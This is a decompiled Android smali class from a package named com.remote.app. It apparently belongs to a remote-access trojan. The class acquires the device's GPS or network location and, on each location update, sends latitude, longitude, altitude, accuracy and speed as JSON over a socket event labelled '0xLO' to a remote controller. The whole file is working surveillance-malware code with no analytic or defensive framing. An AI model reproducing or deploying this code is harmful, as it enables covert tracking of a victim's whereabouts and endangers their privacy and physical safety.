.class public Lcom/remote/app/i;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Landroid/location/LocationListener;


# instance fields
.field private final a:Landroid/content/Context;

.field b:Z

.field c:Z

.field d:Z

.field e:Landroid/location/Location;

.field f:D

.field g:D

.field h:F

.field i:D

.field j:F

.field protected k:Landroid/location/LocationManager;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/remote/app/i;->b:Z

    iput-boolean v0, p0, Lcom/remote/app/i;->c:Z

    iput-boolean v0, p0, Lcom/remote/app/i;->d:Z

    iput-object p1, p0, Lcom/remote/app/i;->a:Landroid/content/Context;

    invoke-virtual {p0}, Lcom/remote/app/i;->c()Landroid/location/Location;

    return-void
.end method


# virtual methods
.method public a()Z
    .locals 1

    iget-boolean v0, p0, Lcom/remote/app/i;->d:Z

    return v0
.end method

.method public b()Lorg/json/JSONObject;
    .locals 4

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    iget-object v1, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    if-eqz v1, :cond_0

    :try_start_0
    const-string v1, "enabled"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v1, "latitude"

    iget-wide v2, p0, Lcom/remote/app/i;->f:D

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v1, "longitude"

    iget-wide v2, p0, Lcom/remote/app/i;->g:D

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v1, "altitude"

    iget-wide v2, p0, Lcom/remote/app/i;->i:D

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v1, "accuracy"

    iget v2, p0, Lcom/remote/app/i;->h:F

    float-to-double v2, v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v1, "speed"

    iget v2, p0, Lcom/remote/app/i;->j:F

    float-to-double v2, v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-object v0
.end method

.method public c()Landroid/location/Location;
    .locals 5

    const-string v0, "network"

    const-string v1, "gps"

    :try_start_0
    iget-object v2, p0, Lcom/remote/app/i;->a:Landroid/content/Context;

    const-string v3, "location"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/location/LocationManager;

    iput-object v2, p0, Lcom/remote/app/i;->k:Landroid/location/LocationManager;

    iget-object v2, p0, Lcom/remote/app/i;->k:Landroid/location/LocationManager;

    invoke-virtual {v2, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v2

    iput-boolean v2, p0, Lcom/remote/app/i;->b:Z

    iget-object v2, p0, Lcom/remote/app/i;->k:Landroid/location/LocationManager;

    invoke-virtual {v2, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v2

    iput-boolean v2, p0, Lcom/remote/app/i;->c:Z

    iget-boolean v2, p0, Lcom/remote/app/i;->b:Z

    if-nez v2, :cond_0

    iget-boolean v2, p0, Lcom/remote/app/i;->c:Z

    if-eqz v2, :cond_2

    :cond_0
    const/4 v2, 0x1

    iput-boolean v2, p0, Lcom/remote/app/i;->d:Z

    sget-object v2, Lcom/remote/app/e;->a:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v3, "android.permission.ACCESS_FINE_LOCATION"

    sget-object v4, Lcom/remote/app/e;->a:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_2

    sget-object v2, Lcom/remote/app/e;->a:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v3, "android.permission.ACCESS_COARSE_LOCATION"

    sget-object v4, Lcom/remote/app/e;->a:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_2

    iget-boolean v2, p0, Lcom/remote/app/i;->c:Z

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/remote/app/i;->k:Landroid/location/LocationManager;

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/remote/app/i;->k:Landroid/location/LocationManager;

    invoke-virtual {v2, v0}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    iput-wide v2, p0, Lcom/remote/app/i;->f:D

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v2

    iput-wide v2, p0, Lcom/remote/app/i;->g:D

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAltitude()D

    move-result-wide v2

    iput-wide v2, p0, Lcom/remote/app/i;->i:D

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    iput v0, p0, Lcom/remote/app/i;->h:F

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    iput v0, p0, Lcom/remote/app/i;->j:F

    :cond_1
    iget-boolean v0, p0, Lcom/remote/app/i;->b:Z

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    if-nez v0, :cond_2

    iget-object v0, p0, Lcom/remote/app/i;->k:Landroid/location/LocationManager;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/remote/app/i;->k:Landroid/location/LocationManager;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/remote/app/i;->f:D

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/remote/app/i;->g:D

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAltitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/remote/app/i;->i:D

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    iput v0, p0, Lcom/remote/app/i;->h:F

    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F

    move-result v0

    iput v0, p0, Lcom/remote/app/i;->j:F
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_2
    :goto_0
    iget-object v0, p0, Lcom/remote/app/i;->e:Landroid/location/Location;

    return-object v0
.end method

.method public onLocationChanged(Landroid/location/Location;)V
    .locals 3

    if-eqz p1, :cond_0

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/remote/app/i;->f:D

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/remote/app/i;->g:D

    invoke-virtual {p1}, Landroid/location/Location;->getAltitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/remote/app/i;->i:D

    invoke-virtual {p1}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    iput v0, p0, Lcom/remote/app/i;->h:F

    invoke-virtual {p1}, Landroid/location/Location;->getSpeed()F

    move-result p1

    iput p1, p0, Lcom/remote/app/i;->j:F

    :cond_0
    invoke-static {}, Lcom/remote/app/h;->a()Lcom/remote/app/h;

    move-result-object p1

    invoke-virtual {p1}, Lcom/remote/app/h;->b()Lb/a/b/I;

    move-result-object p1

    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v1, 0x0

    invoke-virtual {p0}, Lcom/remote/app/i;->b()Lorg/json/JSONObject;

    move-result-object v2

    aput-object v2, v0, v1

    const-string v1, "0xLO"

    invoke-virtual {p1, v1, v0}, Lb/a/b/I;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0

    return-void
.end method
